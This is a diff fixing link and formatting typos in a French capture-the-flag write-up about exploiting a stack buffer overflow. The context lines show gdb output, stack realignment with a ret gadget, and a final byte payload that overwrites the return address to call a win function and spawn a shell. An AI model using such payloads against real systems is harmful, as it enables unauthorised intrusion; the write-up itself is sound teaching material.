@@ -379,7 +379,7 @@ Program received signal SIGSEGV, Segmentation fault.
 => 0x7ffff7e15603 <do_system+339>:	movaps %xmm0,0x50(%rsp)
 ```
 
-Le programme s'arrête sur une instruction movaps, on comprend d'après [ce blog](./https://ropemporium.com/guide.html#Common-pitfalls) que la stack n'est pas aligné correctement en conséquence de nos injections. D'après ce même blog il faudrait rajouter une instruction ret pour la réaligner. Essayons de call à nouveau l'instruction ret dans notre payload, avant d'appeler la fonction win :
+Le programme s'arrête sur une instruction movaps, on comprend d'après [ce blog](https://ropemporium.com/guide.html#Common-pitfalls) que la stack n'est pas aligné correctement en conséquence de nos injections. D'après ce même blog il faudrait rajouter une instruction ret pour la réaligner. Essayons de call à nouveau l'instruction ret dans notre payload, avant d'appeler la fonction win :
 
 ```console
 (gdb) disas vuln
@@ -472,7 +472,7 @@ coucou
 ls
 exploit.py  list_directory  README.md
 ```
-Le shell c'est bien lancé, le payload final est donc "\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
+Le shell c'est bien lancé, le payload final est donc `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
 
 # Script
 
